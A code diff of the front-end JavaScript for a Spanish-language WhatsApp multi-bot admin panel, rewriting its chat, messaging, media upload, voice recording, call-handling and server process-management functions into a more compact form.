+      else if(m.mediaType==='video')media='<video class="wa-vid" controls playsinline preload="metadata" poster="'+tUrl+'" src="'+mUrl+'"></video>';
+      else if(m.mediaType==='audio')media='<audio class="wa-aud" controls preload="metadata" src="'+mUrl+'"></audio>';
+      const rList=Object.values(m.reactions||{});
+      const tools='<div class="wa-tools"><button class="wa-tbtn" onclick="sendAct(\\'react\\',{msgId:\\''+esc(m.id)+'\\',emoji:\\'❤️\\'})">❤️</button><button class="wa-tbtn" onclick="sendAct(\\'react\\',{msgId:\\''+esc(m.id)+'\\',emoji:\\'😂\\'})">😂</button><button class="wa-tbtn" onclick="sendAct(\\'react\\',{msgId:\\''+esc(m.id)+'\\',emoji:\\'🔥\\'})">🔥</button><button class="wa-tbtn" onclick="setReply(\\''+esc(m.id)+'\\')">↩️</button><button class="wa-tbtn" onclick="sendAct(\\'delete\\',{msgId:\\''+esc(m.id)+'\\'})">🗑️</button></div>';
+      return '<div class="wa-mrow '+side+'">'+tools+'<div class="wa-bub '+(isStk?'stk':'')+'">'+sender+quote+media+(m.text?'<div>'+esc(m.text)+'</div>':'')+'<div class="wa-bmeta"><span>'+esc(m.time)+'</span>'+(m.fromMe?'<span>✓✓</span>':'')+'</div></div>'+(rList.length?'<div class="wa-reacts">'+rList.map(esc).join(' ')+'</div>':'')+'</div>';
     }).join('');
-
-    if (selector.dataset.sig !== optsHtml) {
-      selector.dataset.sig = optsHtml;
-      selector.innerHTML = optsHtml;
-      if (callSelector) callSelector.innerHTML = optsHtml;
-      if (prevVal && knownBots.some(b => b.id === prevVal)) {
-        selector.value = prevVal;
-        selectedBotKey = prevVal;
-      } else if (knownBots[0]) {
-        selectedBotKey = knownBots[0].id;
-        selector.value = selectedBotKey;
-      }
-    }
-
-    const sbHtml = knownBots.map((s, i) => '<tr>' +
-      '<td>#' + (i + 1) + '</td>' +
-      '<td><code>+' + escapeHtml(s.id) + '</code></td>' +
-      '<td>' + escapeHtml(s.name) + '</td>' +
-      '<td><span class="pill ' + (s.paused ? 'pill-off' : 'pill-on') + '">' + (s.paused ? 'PAUSADO' : 'ONLINE') + '</span></td>' +
-      '<td>' + escapeHtml(s.role) + '</td>' +
-      '<td>' +
-        '<button class="btn btn-wa" style="padding:5px 8px; margin-right:4px;" onclick="jumpToBotWa(\\'' + escapeHtml(s.id) + '\\')">💬 Chats</button>' +
-        '<button class="btn ' + (s.paused ? 'btn-success' : 'btn-warn') + '" style="padding:5px 8px;" onclick="toggleSingleBot(\\'' + escapeHtml(s.id) + '\\')">' + (s.paused ? '▶️' : '⏸️') + '</button>' +
-      '</td>' +
-    '</tr>').join('');
-    document.getElementById('subbotsTable').innerHTML = sbHtml;
-
-    const spHtml = (d.reports && d.reports.length) ? d.reports.map(r => '<tr>' +
-      '<td><code>+' + escapeHtml(r.phone) + '</code></td>' +
-      '<td><b>' + r.totalReports + '</b></td>' +
-      '<td>' + r.subbotsCount + ' bots</td>' +
-      '<td>' + escapeHtml(r.lastTimestamp) + '</td>' +
-    '</tr>').join('') : '<tr><td colspan="4" style="color:var(--muted)">Sin reportes registrados.</td></tr>';
-    document.getElementById('spamTable').innerHTML = spHtml;
-
-    handleIncomingCallsAlert(d.calls || [], d.autoRejectCalls, d.autoRejectMessage);
-  } catch (e) {
-  } finally {
-    isFetchingStatus = false;
-  }
+    if(scroll||nearBot)box.scrollTop=box.scrollHeight;
+  }catch{}finally{busyMs=false;}
 }
 
-async function loadProcesses() {
-  try {
-    const d = await api('procs', 'GET', null, 5000);
-    const prHtml = (d.processes || []).map(p => '<tr>' +
-      '<td><code>' + escapeHtml(p.pid) + '</code></td>' +
-      '<td>' + escapeHtml(p.comm) + '</td>' +
-      '<td>' + escapeHtml(p.cpu) + '%</td>' +
-      '<td>' + escapeHtml(p.mem) + '%</td>' +
-      '<td><button class="btn btn-danger" style="padding:4px 8px;" onclick="killPid(\\'' + escapeHtml(p.pid) + '\\')">Matar</button></td>' +
-    '</tr>').join('');
-    document.getElementById('procsTable').innerHTML = prHtml;
-  } catch (e) {}
+function setReply(id){const f=msgs.find(x=>x.id===id);if(!f)return;replyMsg=f;el('repWho').textContent=f.pushName||('+'+f.sender);el('repTxt').textContent=f.text||(f.mediaType?'['+f.mediaType.toUpperCase()+']':'Mensaje');el('replyBar').classList.add('active');el('msgInp').focus();}
+function cancelReply(){replyMsg=null;el('replyBar').classList.remove('active');}
+async function sendAct(action,extra={}){if(!botKey||!chatJid)return;await api('wa-action','POST',{action,botKey,jid:chatJid,...extra});loadMsgs(chatJid,false,true);}
+function onTyping(){if(Date.now()-lastTyp>4000&&botKey&&chatJid){lastTyp=Date.now();sendAct('presence',{presence:'composing'});}}
+
+async function sendMsg(e){
+  e.preventDefault();const inp=el('msgInp'),text=inp.value.trim();if(!text||!botKey||!chatJid)return;
+  const quotedId=replyMsg?replyMsg.id:'';inp.value='';cancelReply();el('emoBar').classList.remove('active');
+  const r=await api('wa-send','POST',{botKey,jid:chatJid,text,quotedId});
+  if(r.ok){await loadMsgs(chatJid,true,true);refreshChats(true);}else alert(r.error||'Error');
 }
 
-function handleIncomingCallsAlert(calls, autoRej, autoMsg) {
-  const pill = document.getElementById('callCountPill');
-  if (calls.length > 0) {
-    pill.style.display = 'inline-block';
-    pill.textContent = calls.length;
-  } else {
-    pill.style.display = 'none';
-  }
-
-  const btnAuto = document.getElementById('btnAutoRejectCalls');
-  if (btnAuto) {
-    btnAuto.textContent = autoRej ? '🛡️ Auto-Rechazar: ON' : '🛡️ Auto-Rechazar: OFF';
-    btnAuto.className = 'btn ' + (autoRej ? 'btn-success' : 'btn-warn');
-  }
-  const msgInp = document.getElementById('autoRejectMsgInput');
-  if (msgInp && document.activeElement !== msgInp && autoMsg) {
-    msgInp.value = autoMsg;
-  }
-
-  const recentOffer = calls.find(c => (c.status === 'offer' || c.status === 'ringing') && (Date.now() - c.timestamp < 30000));
-  const banner = document.getElementById('incomingCallBanner');
-  const badge = document.getElementById('callStatusBadge');
-
-  if (recentOffer) {
-    activeBannerCall = recentOffer;
-    document.getElementById('bannerCallType').textContent = recentOffer.isVideo ? '📹 VIDEOLLAMADA ENTRANTE' : '📞 LLAMADA DE VOZ ENTRANTE';
-    document.getElementById('bannerCallBot').textContent = 'Bot +' + recentOffer.botKey;
-    document.getElementById('bannerCallerName').textContent = recentOffer.peerName;
-    document.getElementById('bannerCallerJid').textContent = recentOffer.peerJid;
-    banner.classList.add('active');
-    badge.style.display = 'inline-block';
-  } else {
-    activeBannerCall = null;
-    banner.classList.remove('active');
-    badge.style.display = 'none';
-  }
-}
-
-async function rejectBannerCall() {
-  if (!activeBannerCall) return;
-  await api('wa-call', 'POST', {
-    action: 'reject',
-    botKey: activeBannerCall.botKey,
-    callId: activeBannerCall.id,
-    peerJid: activeBannerCall.peerJid
-  });
-  document.getElementById('incomingCallBanner').classList.remove('active');
-  refreshTelemetry();
-  refreshCallCenter();
-}
-
-function openBannerCallerChat() {
-  if (!activeBannerCall) return;
-  selectedBotKey = activeBannerCall.botKey;
-  const sel = document.getElementById('waBotSelector');
-  if (sel) sel.value = selectedBotKey;
-  const firstBtn = document.querySelector('.tab-btn');
-  switchTab('wa', firstBtn);
-  openWaChat(activeBannerCall.peerJid);
-}
-
-async function refreshCallCenter() {
-  try {
-    const d = await api('status');
-    const calls = d.calls || [];
-    const tbody = document.getElementById('callsTable');
-    if (!calls.length) {
-      tbody.innerHTML = '<tr><td colspan="7" style="color:var(--muted); text-align:center;">No hay llamadas registradas en esta sesión.</td></tr>';
-      return;
-    }
-    tbody.innerHTML = calls.map(c => '<tr>' +
-      '<td>' + escapeHtml(c.timeStr) + '</td>' +
-      '<td><code>+' + escapeHtml(c.botKey) + '</code></td>' +
-      '<td><b>' + escapeHtml(c.peerName) + '</b><br><span style="color:var(--muted);font-size:11px;">' + escapeHtml(c.peerJid) + '</span></td>' +
-      '<td>' + (c.isVideo ? '📹 Video' : '📞 Voz') + '</td>' +
-      '<td>' + (c.direction === 'outgoing' ? '↗️ Saliente' : '↙️ Entrante') + '</td>' +
-      '<td><span class="pill ' + (c.status === 'reject' ? 'pill-off' : 'pill-on') + '">' + escapeHtml(c.status.toUpperCase()) + '</span></td>' +
-      '<td>' +
-        '<button class="btn btn-danger" style="padding:4px 8px; margin-right:4px;" onclick="rejectCallById(\\'' + escapeHtml(c.botKey) + '\\', \\'' + escapeHtml(c.id) + '\\', \\'' + escapeHtml(c.peerJid) + '\\')">📵 Cortar</button>' +
-        '<button class="btn btn-wa" style="padding:4px 8px;" onclick="jumpToCallChat(\\'' + escapeHtml(c.botKey) + '\\', \\'' + escapeHtml(c.peerJid) + '\\')">💬 Chat</button>' +
-      '</td>' +
-    '</tr>').join('');
-  } catch (e) {}
-}
-
-async function rejectCallById(botKey, callId, peerJid) {
-  await api('wa-call', 'POST', { action: 'reject', botKey, callId, peerJid });
-  refreshCallCenter();
-}
-
-function jumpToCallChat(botKey, peerJid) {
-  selectedBotKey = botKey;
-  const sel = document.getElementById('waBotSelector');
-  if (sel) sel.value = botKey;
-  const firstBtn = document.querySelector('.tab-btn');
-  switchTab('wa', firstBtn);
-  openWaChat(peerJid);
-}
-
-async function toggleAutoRejectCalls() {
-  await api('wa-call', 'POST', { action: 'toggle-autoreject' });
-  refreshTelemetry();
-}
-
-async function saveAutoRejectSettings() {
-  const msg = document.getElementById('autoRejectMsgInput').value.trim();
-  await api('wa-call', 'POST', { action: 'set-message', message: msg });
-  alert('Mensaje de auto-rechazo actualizado.');
-}
-
-async function clearCallLogs() {
-  await api('wa-call', 'POST', { action: 'clear-logs' });
-  refreshCallCenter();
-}
-
-async function initiateManualCall() {
-  const botKey = document.getElementById('callBotSelector').value || selectedBotKey;
-  const rawTarget = document.getElementById('callTargetInput').value.trim();
-  const isVideo = document.getElementById('callTypeSelect').value === 'video';
-  if (!rawTarget) return alert('Ingresa un número o JID destino');
-  const peerJid = rawTarget.includes('@') ? rawTarget : rawTarget.replace(/\\D/g, '') + '@s.whatsapp.net';
-  const r = await api('wa-call', 'POST', {
-    action: 'offer',
-    botKey,
-    peerJid,
-    isVideo
-  });
-  if (r.ok) {
-    alert('Señal de llamada enviada hacia ' + peerJid);
-    refreshCallCenter();
-  } else {
-    alert(r.error || 'Error al iniciar llamada');
-  }
-}
-
-async function triggerCallFromChat(isVideo) {
-  if (!selectedBotKey || !selectedChatJid) return;
-  const r = await api('wa-call', 'POST', {
-    action: 'offer',
-    botKey: selectedBotKey,
-    peerJid: selectedChatJid,
-    isVideo
-  });
-  if (r.ok) {
-    loadWaMessages(selectedChatJid, true, true);
-  }
-}
-
-function setChatFilter(mode, btn) {
-  chatFilterMode = mode;
-  document.querySelectorAll('.wa-chip').forEach(c => c.classList.remove('active'));
-  btn.classList.add('active');
-  renderWaChatList(true);
-}
-
-function jumpToBotWa(botKey) {
-  selectedBotKey = botKey;
-  const sel = document.getElementById('waBotSelector');
-  if (sel) sel.value = botKey;
-  selectedChatJid = "";
-  lastChatListSignature = "";
-  lastMsgListSignature = "";
-  const firstTabBtn = document.querySelector('.tab-btn');
-  switchTab('wa', firstTabBtn);
-}
-
-function onSelectSubbot() {
-  const sel = document.getElementById('waBotSelector');
-  selectedBotKey = sel.value;
-  selectedChatJid = "";
-  lastChatListSignature = "";
-  lastMsgListSignature = "";
-  closeMobileChat();
-  document.getElementById('waChatList').innerHTML = '<div style="padding:24px; text-align:center; color:#00e5ff; font-size:13px;">⚡ Cargando sesión de +' + escapeHtml(selectedBotKey) + '...</div>';
-  refreshWaChats(true);
-}
-
-async function syncSubbotGroups() {
-  if (!selectedBotKey) return;
-  await api('wa-sync', 'POST', { botKey: selectedBotKey });
-  setTimeout(() => refreshWaChats(true), 700);
-}
-
-async function refreshWaChats(forceRender = false) {
-  if (isFetchingChats && !forceRender) return;
-  if (!selectedBotKey && knownBots[0]) selectedBotKey = knownBots[0].id;
-  if (!selectedBotKey) return;
-  isFetchingChats = true;
-  try {
-    const d = await api('wa-chats?botKey=' + encodeURIComponent(selectedBotKey), 'GET', null, 5000);
-    cachedChats = d.chats || [];
-    renderWaChatList(forceRender);
-    if (selectedChatJid) {
-      await loadWaMessages(selectedChatJid, false, forceRender);
-    }
-  } catch (e) {
-  } finally {
-    isFetchingChats = false;
-  }
-}
-
-function renderAvatarNode(name, jid, isGroup, cachedAvatarUrl) {
-  const initials = (name || '?').replace(/[^a-zA-Z0-9]/g, '').slice(0, 2).toUpperCase() || (isGroup ? '👥' : '👤');
-  if (cachedAvatarUrl) {
-    return '<img src="' + escapeHtml(cachedAvatarUrl) + '" loading="lazy" onerror="this.style.display=\\'none\\'; this.parentNode.textContent=\\'' + escapeHtml(initials) + '\\';" alt="">';
-  }
-  const avatarUrl = '/api/wa-avatar?botKey=' + encodeURIComponent(selectedBotKey) + '&jid=' + encodeURIComponent(jid) + '&token=' + TOKEN;
-  return '<img src="' + avatarUrl + '" loading="lazy" onerror="this.style.display=\\'none\\'; this.parentNode.textContent=\\'' + escapeHtml(initials) + '\\';" alt="">';
-}
-
-function renderWaChatList(forceRender = false) {
-  const q = (document.getElementById('waSearchInput').value || '').toLowerCase().trim();
-  const listEl = document.getElementById('waChatList');
-  const filtered = cachedChats.filter(c => {
-    if (chatFilterMode === 'unread' && (!c.unread || c.unread <= 0)) return false;
-    if (chatFilterMode === 'groups' && !c.isGroup) return false;
-    if (chatFilterMode === 'direct' && c.isGroup) return false;
-    return (
-      c.name.toLowerCase().includes(q) ||
-      c.jid.toLowerCase().includes(q) ||
-      (c.lastPreview || '').toLowerCase().includes(q)
-    );
-  });
-
-  const sig = selectedBotKey + '|' + selectedChatJid + '|' + chatFilterMode + '|' + q + '|' + filtered.map(c => c.jid + ':' + c.lastTime + ':' + c.unread + ':' + c.lastPreview).join(',');
-  if (!forceRender && sig === lastChatListSignature) return;
-  lastChatListSignature = sig;
-
-  if (!filtered.length) {
-    listEl.innerHTML = '<div style="padding:24px; text-align:center; color:#8696a0; font-size:12px;">Sin conversaciones en este filtro. Pulsa 🔄 para sincronizar grupos o ➕ para abrir un chat nuevo.</div>';
-    return;
-  }
-
-  listEl.innerHTML = filtered.slice(0, 120).map(c => {
-    const activeCls = c.jid === selectedChatJid ? 'active' : '';
-    const timeStr = c.lastTime ? new Date(c.lastTime).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
-    const unreadHtml = c.unread > 0 ? '<span class="wa-unread">' + c.unread + '</span>' : '';
-    return '<div class="wa-chat-item ' + activeCls + '" onclick="openWaChat(\\'' + escapeHtml(c.jid) + '\\')">' +
-      '<div class="wa-avatar" style="background:' + (c.isGroup ? '#5e35b1' : '#008069') + '">' + renderAvatarNode(c.name, c.jid, c.isGroup, c.avatarUrl) + '</div>' +
-      '<div class="wa-chat-meta">' +
-        '<div class="wa-chat-name">' + escapeHtml(c.name) + '</div>' +
-        '<div class="wa-chat-prev">' + escapeHtml(c.lastPreview || c.jid) + '</div>' +
-      '</div>' +
-      '<div class="wa-chat-right">' +
-        '<div class="wa-chat-time">' + escapeHtml(timeStr) + '</div>' +
-        unreadHtml +
-      '</div>' +
-    '</div>';
-  }).join('');
-}
-
-async function openWaChat(jid) {
-  selectedChatJid = jid;
-  lastMsgListSignature = "";
-  cancelReply();
-  document.getElementById('waWrapper').classList.add('chat-open');
-  document.getElementById('waHeaderActions').style.display = 'flex';
-  renderWaChatList(true);
-  await loadWaMessages(jid, true, true);
-}
-
-function closeMobileChat() {
-  document.getElementById('waWrapper').classList.remove('chat-open');
-  document.getElementById('waInfoDrawer').classList.remove('open');
-}
-
-function toggleChatDrawer() {
-  if (!selectedChatJid) return;
-  const drawer = document.getElementById('waInfoDrawer');
-  drawer.classList.toggle('open');
-}
-
-async function loadWaMessages(jid, scrollBottom = false, forceRender = false) {
-  if (isFetchingMsgs && !forceRender) return;
-  if (!selectedBotKey || !jid) return;
-  isFetchingMsgs = true;
-  try {
-    const d = await api('wa-messages?botKey=' + encodeURIComponent(selectedBotKey) + '&jid=' + encodeURIComponent(jid), 'GET', null, 5000);
-    if (!d.chat) return;
-
-    currentMessages = d.chat.messages || [];
-    const msgSig = selectedBotKey + '|' + jid + '|' + currentMessages.map(m => m.id + ':' + m.text + ':' + (m.mediaReady ? '1' : '0') + ':' + Object.values(m.reactions || {}).join('')).join(',');
-
-    if (!forceRender && msgSig === lastMsgListSignature) {
-      return;
-    }
-    lastMsgListSignature = msgSig;
-
-    document.getElementById('waActiveName').textContent = d.chat.name || jid;
-    document.getElementById('waActiveJid').textContent = '+' + selectedBotKey + ' • ' + d.chat.jid;
-    document.getElementById('waActiveAvatar').innerHTML = renderAvatarNode(d.chat.name, d.chat.jid, d.chat.isGroup, d.chat.avatarUrl);
-
-    document.getElementById('drawerName').textContent = d.chat.name || jid;
-    document.getElementById('drawerJid').textContent = d.chat.jid;
-    document.getElementById('drawerBio').textContent = d.chat.statusText || (d.chat.isGroup ? 'Grupo de WhatsApp activo' : 'Cuenta de WhatsApp');
-    document.getElementById('drawerAvatar').innerHTML = renderAvatarNode(d.chat.name, d.chat.jid, d.chat.isGroup, d.chat.avatarUrl);
-
-    const box = document.getElementById('waMessagesBox');
-    const wasNearBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 150;
-
-    if (!currentMessages.length) {
-      box.innerHTML = '<div style="margin:auto; color:#8696a0; font-size:12px; text-align:center; background:#111b21; padding:14px 20px; border-radius:10px;">🔒 Los mensajes y archivos multimedia que envíes o recibas en esta conversación aparecerán aquí en tiempo real.</div>';
-      return;
-    }
-
-    box.innerHTML = currentMessages.map(m => {
-      const side = m.fromMe ? 'out' : 'in';
-      const isSticker = m.mediaType === 'sticker';
-      const senderHeader = (!m.fromMe && d.chat.isGroup && !isSticker)
-        ? '<div class="wa-bubble-sender" onclick="mentionUserInComposer(\\'' + escapeHtml(m.sender) + '\\')">' + escapeHtml(m.pushName || '+' + m.sender) + '</div>'
-        : '';
-
-      let quotedHtml = '';
-      if (m.quotedText) {
-        quotedHtml = '<div class="wa-quoted-box">' +
-          '<div class="wa-quoted-sender">' + escapeHtml(m.quotedSender ? '+' + m.quotedSender : 'Cita') + '</div>' +
-          '<div>' + escapeHtml(m.quotedText) + '</div>' +
-        '</div>';
-      }
-
-      let mediaHtml = '';
-      const mediaUrl = '/api/media?id=' + encodeURIComponent(m.id) + '&botKey=' + encodeURIComponent(selectedBotKey) + '&token=' + TOKEN;
-      const thumbUrl = '/api/thumb?id=' + encodeURIComponent(m.id) + '&token=' + TOKEN;
-
-      if (m.mediaType === 'image') {
-        mediaHtml = '<img class="wa-media-img" src="' + mediaUrl + '" loading="lazy" onclick="openLightbox(\\'' + mediaUrl + '\\')" alt="Imagen">';
-      } else if (m.mediaType === 'sticker') {
-        mediaHtml = '<img class="wa-media-sticker" src="' + mediaUrl + '" loading="lazy" onclick="openLightbox(\\'' + mediaUrl + '\\')" alt="Sticker">';
-      } else if (m.mediaType === 'video') {
-        mediaHtml = '<video class="wa-media-video" controls playsinline preload="metadata" poster="' + thumbUrl + '" src="' + mediaUrl + '"></video>';
-      } else if (m.mediaType === 'audio') {
-        mediaHtml = '<audio class="wa-media-audio" controls preload="metadata" src="' + mediaUrl + '"></audio>';
-      }
-
-      const textHtml = m.text ? '<div>' + escapeHtml(m.text) + '</div>' : '';
-
-      const reactionsEntries = Object.values(m.reactions || {});
-      const reactionsHtml = reactionsEntries.length
-        ? '<div class="wa-reactions-pill">' + reactionsEntries.map(r => escapeHtml(r)).join(' ') + '</div>'
-        : '';
-
-      const toolsHtml = '<div class="wa-msg-tools">' +
-        '<button class="wa-tool-btn" onclick="reactToMsg(\\'' + escapeHtml(m.id) + '\\', \\'❤️\\')" title="Me encanta">❤️</button>' +
-        '<button class="wa-tool-btn" onclick="reactToMsg(\\'' + escapeHtml(m.id) + '\\', \\'😂\\')" title="Risa">😂</button>' +
-        '<button class="wa-tool-btn" onclick="reactToMsg(\\'' + escapeHtml(m.id) + '\\', \\'🔥\\')" title="Fuego">🔥</button>' +
-        '<button class="wa-tool-btn" onclick="reactToMsg(\\'' + escapeHtml(m.id) + '\\', \\'👍\\')" title="Like">👍</button>' +
-        '<button class="wa-tool-btn" onclick="setReplyMsg(\\'' + escapeHtml(m.id) + '\\')" title="Responder">↩️</button>' +
-        '<button class="wa-tool-btn" onclick="deleteMsgForAll(\\'' + escapeHtml(m.id) + '\\')" title="Eliminar para todos">🗑️</button>' +
-      '</div>';
-
-      return '<div class="wa-msg-row ' + side + '">' +
-        toolsHtml +
-        '<div class="wa-bubble ' + (isSticker ? 'sticker-bubble' : '') + '">' +
-          senderHeader +
-          quotedHtml +
-          mediaHtml +
-          textHtml +
-          '<div class="wa-bubble-meta"><span>' + escapeHtml(m.time) + '</span>' + (m.fromMe ? '<span>✓✓</span>' : '') + '</div>' +
-        '</div>' +
-        reactionsHtml +
-      '</div>';
-    }).join('');
-
-    if (scrollBottom || wasNearBottom) {
-      box.scrollTop = box.scrollHeight;
-    }
-  } catch (e) {
-  } finally {
-    isFetchingMsgs = false;
-  }
-}
-
-function mentionUserInComposer(num) {
-  const inp = document.getElementById('waMessageInput');
-  inp.value += '@' + num + ' ';
-  inp.focus();
-}
-
-function setReplyMsg(msgId) {
-  const found = currentMessages.find(x => x.id === msgId);
-  if (!found) return;
-  replyTargetMsg = found;
-  document.getElementById('waReplySender').textContent = found.pushName || ('+' + found.sender);
-  document.getElementById('waReplyText').textContent = found.text || (found.mediaType ? '[' + found.mediaType.toUpperCase() + ']' : 'Mensaje');
-  document.getElementById('waReplyBar').classList.add('active');
-  document.getElementById('waMessageInput').focus();
-}
-
-function cancelReply() {
-  replyTargetMsg = null;
-  const bar = document.getElementById('waReplyBar');
-  if (bar) bar.classList.remove('active');
-}
-
-async function reactToMsg(msgId, emoji) {
-  if (!selectedBotKey || !selectedChatJid) return;
-  await api('wa-action', 'POST', {
-    action: 'react',
-    botKey: selectedBotKey,
-    jid: selectedChatJid,
-    msgId,
-    emoji
-  });
-  loadWaMessages(selectedChatJid, false, true);
-}
-
-async function deleteMsgForAll(msgId) {
-  if (!selectedBotKey || !selectedChatJid) return;
-  await api('wa-action', 'POST', {
-    action: 'delete',
-    botKey: selectedBotKey,
-    jid: selectedChatJid,
-    msgId
-  });
-  loadWaMessages(selectedChatJid, false, true);
-}
-
-async function sendPresenceState(stateType) {
-  if (!selectedBotKey || !selectedChatJid) return;
-  await api('wa-action', 'POST', {
-    action: 'presence',
-    botKey: selectedBotKey,
-    jid: selectedChatJid,
-    presence: stateType
-  });
-}
-
-function onComposerTyping() {
-  const now = Date.now();
-  if (now - lastTypingSent > 4000 && selectedBotKey && selectedChatJid) {
-    lastTypingSent = now;
-    sendPresenceState('composing');
-  }
-}
-
-async function sendWaMessage(e) {
-  e.preventDefault();
-  const inp = document.getElementById('waMessageInput');
-  const text = inp.value.trim();
-  if (!text || !selectedBotKey) return;
-  if (!selectedChatJid) {
-    alert('Selecciona primero un chat o pulsa ➕ para ingresar un número.');
-    return;
-  }
-  const quotedId = replyTargetMsg ? replyTargetMsg.id : '';
-  inp.value = '';
-  cancelReply();
-  document.getElementById('waEmojiBar').classList.remove('active');
-
-  const r = await api('wa-send', 'POST', {
-    botKey: selectedBotKey,
-    jid: selectedChatJid,
-    text,
-    quotedId
-  });
-  if (r.ok) {
-    await loadWaMessages(selectedChatJid, true, true);
-    refreshWaChats(true);
-  } else {
-    alert(r.error || 'No se pudo enviar el mensaje');
-  }
-}
-
-async function handleMediaUpload(e) {
-  const file = e.target.files[0];
-  e.target.value = '';
-  if (!file || !selectedBotKey || !selectedChatJid) return;
-
-  const isSticker = file.name.toLowerCase().endsWith('.webp');
-  const caption = isSticker ? '' : (prompt('Texto o comentario adjunto (opcional):', '') || '');
-
-  const reader = new FileReader();
-  reader.onload = async () => {
-    const base64Data = String(reader.result || '').split(',')[1] || '';
-    if (!base64Data) return;
-    const r = await api('wa-send-media', 'POST', {
-      botKey: selectedBotKey,
-      jid: selectedChatJid,
-      fileName: file.name,
-      mimeType: file.type || 'application/octet-stream',
-      asSticker,
-      caption,
-      base64: base64Data,
-      quotedId: replyTargetMsg ? replyTargetMsg.id : ''
-    }, 20000);
-    cancelReply();
-    if (r.ok) {
-      await loadWaMessages(selectedChatJid, true, true);
-      refreshWaChats(true);
-    } else {
-      alert(r.error || 'Error enviando archivo multimedia');
-    }
+function uploadMedia(e){
+  const f=e.target.files[0];e.target.value='';if(!f||!botKey||!chatJid)return;
+  const asSticker=f.name.toLowerCase().endsWith('.webp');
+  const caption=asSticker?'':(prompt('Comentario adjunto (opcional):','')||'');
+  const rd=new FileReader();
+  rd.onload=async()=>{
+    const base64=String(rd.result||'').split(',')[1]||'';if(!base64)return;
+    const r=await api('wa-send-media','POST',{botKey,jid:chatJid,fileName:f.name,mimeType:f.type||'application/octet-stream',asSticker,caption,base64,quotedId:replyMsg?replyMsg.id:''},20000);
+    cancelReply();if(r.ok){await loadMsgs(chatJid,true,true);refreshChats(true);}else alert(r.error||'Error');
   };
-  reader.readAsDataURL(file);
+  rd.readAsDataURL(f);
 }
 
-async function toggleVoiceRecording() {
-  const btn = document.getElementById('waVoiceBtn');
-  if (!selectedBotKey || !selectedChatJid) {
-    return alert('Selecciona un chat primero.');
-  }
-  if (mediaRecorder && mediaRecorder.state === 'recording') {
-    mediaRecorder.stop();
-    btn.style.background = '#2a3942';
-    btn.textContent = '🎤';
-    return;
-  }
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    recordedChunks = [];
-    mediaRecorder = new MediaRecorder(stream);
-    mediaRecorder.ondataavailable = (ev) => {
-      if (ev.data.size > 0) recordedChunks.push(ev.data);
-    };
-    mediaRecorder.onstop = async () => {
-      stream.getTracks().forEach(t => t.stop());
-      const blob = new Blob(recordedChunks, { type: 'audio/ogg; codecs=opus' });
-      const reader = new FileReader();
-      reader.onload = async () => {
-        const base64 = String(reader.result || '').split(',')[1] || '';
-        if (!base64) return;
-        await api('wa-send-media', 'POST', {
-          botKey: selectedBotKey,
-          jid: selectedChatJid,
-          fileName: 'voice.ogg',
-          mimeType: 'audio/ogg; codecs=opus',
-          isPtt: true,
-          base64
-        }, 20000);
-        await loadWaMessages(selectedChatJid, true, true);
-        refreshWaChats(true);
-      };
-      reader.readAsDataURL(blob);
-    };
-    mediaRecorder.start();
-    btn.style.background = '#ff2a54';
-    btn.textContent = '⏹️';
-    sendPresenceState('recording');
-  } catch (err) {
-    alert('Permiso de micrófono denegado o navegador no compatible.');
-  }
+async function recVoice(){
+  const btn=el('micBtn');if(!botKey||!chatJid)return alert('Abre un chat primero');
+  if(rec&&rec.state==='recording'){rec.stop();btn.style.background='#2a3942';btn.textContent='🎤';return;}
+  try{
+    const st=await navigator.mediaDevices.getUserMedia({audio:true});chunks=[];rec=new MediaRecorder(st);
+    rec.ondataavailable=ev=>{if(ev.data.size>0)chunks.push(ev.data);};
+    rec.onstop=()=>{st.getTracks().forEach(t=>t.stop());const rd=new FileReader();rd.onload=async()=>{const base64=String(rd.result||'').split(',')[1]||'';if(base64){await api('wa-send-media','POST',{botKey,jid:chatJid,fileName:'voice.ogg',mimeType:'audio/ogg; codecs=opus',isPtt:true,base64},20000);loadMsgs(chatJid,true,true);refreshChats(true);}};rd.readAsDataURL(new Blob(chunks,{type:'audio/ogg; codecs=opus'}));};
+    rec.start();btn.style.background='#ff2a54';btn.textContent='⏹️';sendAct('presence',{presence:'recording'});
+  }catch{alert('Micrófono no disponible');}
 }
 
-async function sendStickerQuickPrompt() {
-  if (!selectedBotKey || !selectedChatJid) return;
-  const url = prompt('Ingresa la URL directa de una imagen (.webp / .png / .jpg):');
-  if (!url) return;
-  const r = await api('wa-send-media', 'POST', {
-    botKey: selectedBotKey,
-    jid: selectedChatJid,
-    mediaUrl: url.trim(),
-    asSticker: true
-  }, 15000);
-  if (r.ok) {
-    loadWaMessages(selectedChatJid, true, true);
-  } else {
-    alert(r.error || 'Error enviando sticker');
-  }
-}
+async function promptSticker(){const u=prompt('URL de imagen (.webp/.png/.jpg):');if(u&&botKey&&chatJid){await api('wa-send-media','POST',{botKey,jid:chatJid,mediaUrl:u.trim(),asSticker:true},15000);loadMsgs(chatJid,true,true);}}
+async function newChat(){const r=prompt('Número con prefijo (ej: 573001234567) o JID:');if(!r)return;const jid=r.includes('@')?r.trim():r.replace(/\\D/g,'')+'@s.whatsapp.net';if(jid.length<10)return;await api('wa-init-chat','POST',{botKey,jid});await refreshChats(true);openChat(jid);}
+async function clearChat(){if(botKey&&chatJid){await api('wa-clear-chat','POST',{botKey,jid:chatJid});loadMsgs(chatJid,true,true);refreshChats(true);}}
 
-async function blockOrUnblockCurrentChat(mode) {
-  if (!selectedBotKey || !selectedChatJid) return;
-  const r = await api('wa-action', 'POST', {
-    action: mode,
-    botKey: selectedBotKey,
-    jid: selectedChatJid
-  });
-  if (r.ok) {
-    alert(mode === 'block' ? 'Contacto bloqueado.' : 'Contacto desbloqueado.');
-  }
-}
+async function loadProcs(){try{const d=await api('procs');el('procsTb').innerHTML=(d.processes||[]).map(p=>'<tr><td><code>'+esc(p.pid)+'</code></td><td>'+esc(p.comm)+'</td><td>'+esc(p.cpu)+'%</td><td>'+esc(p.mem)+'%</td><td><button class="btn btn-danger" style="padding:4px 8px" onclick="api(\\'kill-proc\\',\\'POST\\',{pids:[\\''+esc(p.pid)+'\\']}).then(loadProcs)">Matar</button></td></tr>').join('');}catch{}}
+async function killPids(){const pids=el('pidsInp').value.split(',').map(s=>s.trim()).filter(Boolean);if(pids.length){await api('kill-proc','POST',{pids});el('pidsInp').value='';loadProcs();}}
+async function cleanRam(){const r=await api('clean-ram','POST',{});alert('RAM actual: '+r.afterMb+' MB');refreshStatus();}
